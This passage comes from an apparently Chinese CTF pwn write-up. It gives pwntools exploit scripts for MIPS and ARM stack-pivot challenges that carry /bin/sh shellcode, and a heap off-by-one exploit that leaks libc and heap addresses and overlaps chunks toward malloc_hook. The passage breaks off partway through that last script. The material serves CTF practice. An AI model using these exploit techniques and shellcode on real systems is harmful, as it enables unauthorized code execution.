</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="ez1-0-mips" tabindex="-1"><a class="header-anchor" href="#ez1-0-mips" aria-hidden="true">#</a> EZ1.0?(mips)</h2><blockquote><p>白给 一个栈迁移 然后到bss端执行shellcode</p></blockquote><ul><li>本地bss没有可执行权限但是远程有 这题应该麻烦的是搭建mips环境</li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> time

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;mips&#39;</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">&quot;little&quot;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>
<span class="token comment"># p = process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;12345&quot;, &quot;-L&quot;, &quot;/usr/mipsel-linux-gnu/&quot;, &quot;./mips&quot;])</span>
<span class="token comment"># pwnlib.qemu.user_path(arch=&#39;mips&#39;)</span>
<span class="token comment"># pwnlib.qemu.ld_prefix(arch=&#39;mips&#39;)</span>
file_name <span class="token operator">=</span> <span class="token string">&quot;./mips&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;127.0.0.1&quot;</span>
port <span class="token operator">=</span> <span class="token number">50176</span>
stack_addr <span class="token operator">=</span>  <span class="token number">0x7ffff000</span>
<span class="token comment"># elf = ELF(file_name)</span>
<span class="token comment"># p= process(file_name)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">b&quot;b&quot;</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x493400</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x400864</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b&quot;welcome XYCTF mips world&quot;</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

payload<span class="token operator">=</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x493460</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b&quot;\\x11\\x01\\x06\\x24\\xff\\xff\\xd0\\x04\\x00\\x00\\x06\\x24\\xe0\\xff\\xbd\\x27\\x14\\x00\\xe4\\x27\\x00\\x00\\x05\\x24\\xab\\x0f\\x02\\x24\\x0c\\x00\\x00\\x00/bin/sh&quot;</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="ez2-0-arm" tabindex="-1"><a class="header-anchor" href="#ez2-0-arm" aria-hidden="true">#</a> EZ2.0?(arm)</h2><blockquote><p>和mips一模一样 栈迁移 然后shellcode</p></blockquote><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;mips&#39;,endian=&quot;little&quot;, log_level=&#39;debug&#39;)</span>
context<span class="token punctuation">(</span> arch<span class="token operator">=</span><span class="token string">&#39;arm&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


file_name <span class="token operator">=</span> <span class="token string">&quot;./arm&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;127.0.0.1&quot;</span>
port <span class="token operator">=</span> <span class="token number">57621</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b vuln&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;bss:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;welcome XYCTF arm world\\n&quot;</span><span class="token punctuation">)</span>
sd<span class="token punctuation">(</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">+</span><span class="token number">0x44</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x10588</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
shellcode  <span class="token operator">=</span> <span class="token string">b&quot;\\x02\\x20\\x42\\xe0\\x1c\\x30\\x8f\\xe2&quot;</span>
shellcode <span class="token operator">+=</span> <span class="token string">b&quot;\\x04\\x30\\x8d\\xe5\\x08\\x20\\x8d\\xe5&quot;</span>
shellcode <span class="token operator">+=</span> <span class="token string">b&quot;\\x13\\x02\\xa0\\xe1\\x07\\x20\\xc3\\xe5&quot;</span>
shellcode <span class="token operator">+=</span> <span class="token string">b&quot;\\x04\\x30\\x8f\\xe2\\x04\\x10\\x8d\\xe2&quot;</span>
shellcode <span class="token operator">+=</span> <span class="token string">b&quot;\\x01\\x20\\xc3\\xe5\\x0b\\x0b\\x90\\xef&quot;</span>
shellcode <span class="token operator">+=</span> <span class="token string">b&quot;/bin/sh&quot;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;shellcode:&quot;</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span>
<span class="token comment"># input(&quot;test&quot;)</span>
<span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;test&quot;</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">+</span><span class="token number">0x44</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span> <span class="token number">0x8afc4</span> <span class="token punctuation">)</span><span class="token operator">+</span>shellcode
sd<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="one-byte" tabindex="-1"><a class="header-anchor" href="#one-byte" aria-hidden="true">#</a> one_byte</h2><blockquote><p>写入chunk的时候多写了一位0 造成one_byte漏洞</p></blockquote><ul><li><p>通过chunk进入unsortedbin中然后输出<code>fd</code>和<code>bk</code>泄露libc地址</p></li><li><p>通过chunk进入tcache然后 malloc回来 然后输出chunk内容 泄露<code>heap</code>地址</p></li></ul><h3 id="劫持freechunk" tabindex="-1"><a class="header-anchor" href="#劫持freechunk" aria-hidden="true">#</a> 劫持freechunk</h3><ul><li>因为这题用的两个全局变量来存储的使用情况和chunk地址 我们不太方便伪造<code>fake head</code>来实现劫持</li><li>因为存在off_by_one漏洞 我们可以利用合并机制 进行修改一些已经进入bin链的chunk 修改其fd 然后我们再通过malloc 就可以实现malloc下来一个任意地址 这里我们选择打malloc hook</li><li>大致就是构造一个情况:a b c 三个chunk 然后ac都为<code>unsortedbin chunk</code> b为<code>fastbin chunk</code>然后让ac触发合并机制 把b包含在合并后的大chunk中 我们再将这个大chunk malloc下来 这样我们就可以修改b chunk了</li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> time

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;mips&#39;,endian=&quot;little&quot;, log_level=&#39;debug&#39;)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)</span>
context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>
file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;127.0.0.1&quot;</span>
port <span class="token operator">=</span> <span class="token number">65030</span>
<span class="token comment"># elf = ELF(file_name)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b *main+34&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">recv_menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token string">&quot;b *main+34&quot;</span><span class="token punctuation">)</span>
    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;stop&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    recv_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;1&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] please input chunk_idx: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk size: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;---------------\\nadd chunk {}\\n---------------&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    recv_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;2&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] please input chunk_idx: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;---------------\\ndelete chunk {}\\n---------------&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    recv_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;4&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] please input chunk_idx: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
    sd<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    recv_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;3&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] please input chunk_idx: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> rc<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token comment"># 0-7是占用状态</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> view<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span>
base_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2019072</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_libc:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> view<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span>
base_heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1216</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_heap:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 开始构造一个chunk处于fastbin中情况</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;占用的已经删除&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># 要实现tcache满 然后fastbin中存在</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x120</span><span class="token punctuation">)</span>
<span class="token comment"># prev_size size fd bk</span>
chunk_addr <span class="token operator">=</span> base_heap
fakechunk <span class="token operator">=</span> <span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">721</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_heap<span class="token operator">+</span><span class="token number">5696</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_heap<span class="token operator">+</span><span class="token number">5696</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_heap<span class="token operator">+</span><span class="token number">5664</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>
<span class="token comment"># 合并chunk</span>
add<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">0x120</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span>fakechunk<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">)</span>
<span class="token comment"># 用于覆写</span>
add<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">0x138</span><span class="token punctuation">)</span>
<span class="token comment"># 用于合并</span>
add<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">0x120</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
<span class="token comment"># delete(1)</span>
delete<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x130</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">720</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b&quot;\\x30&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_heap:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_libc:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_heap:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_libc:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">0x170</span><span class="token punctuation">)</span>
<span class="token comment"># 构造到malloc hook</span>
